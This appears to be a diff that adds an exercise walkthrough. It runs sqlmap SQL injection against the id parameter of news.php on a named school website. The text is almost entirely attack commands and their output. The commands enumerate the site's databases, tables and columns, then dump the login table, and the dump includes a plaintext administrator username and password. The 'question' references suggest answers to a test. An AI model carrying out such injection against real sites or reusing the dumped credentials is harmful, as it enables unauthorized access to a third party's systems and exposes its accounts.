@@ -1,0 +1,37 @@
+We are going to use sqlmap on https://paramekkavuvidyamandir.edu.in/news.php?id=129 website. First we need to find the database of this website so we use the following command -
+sqlmap -u https://paramekkavuvidyamandir.edu.in/news.php?id=129 --dbs --batch --random-agent
+Here, random-agent means to swap the User-Agent string so requests look like they come from different browsers/devices. After running the command we found-
+available databases [2]:
+[*] information_schema
+[*] u481774022_vidyamandir
+Now to find the tables we run -
+sqlmap -u https://paramekkavuvidyamandir.edu.in/news.php?id=129 -D u481774022_vidyamandir --tables --batch --random-agent
+Database: u481774022_vidyamandir
+[4 tables]
++--------------+
+| eventphotos  |
+| events_news  |
+| events_texts |
+| login        |
++--------------+
+We found the answer of question-1 and that is 4. Now 'login' table looks important so we check it by running the below command -
+sqlmap -u https://paramekkavuvidyamandir.edu.in/news.php?id=129 -D u481774022_vidyamandir -T login --columns --batch --random-agent    
+Table: login
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| password | varchar(255) |
+| username | varchar(255) |
++----------+--------------+
+sqlmap -u https://paramekkavuvidyamandir.edu.in/news.php?id=129 -D u481774022_vidyamandir -T login -C id,password,username --dump  --batch --random-agent
+Table: login
+[1 entry]
++----+------------+-------------------+
+| id | password   | username          |
++----+------------+-------------------+
+| 5  | Fci@123dfg | pakavuvidyamandir |
++----+------------+-------------------+
+We found the answers of question-2 and 3. For 3, search base64 encoder/decoder or go to https://www.dcode.fr/ to encode the password.
+
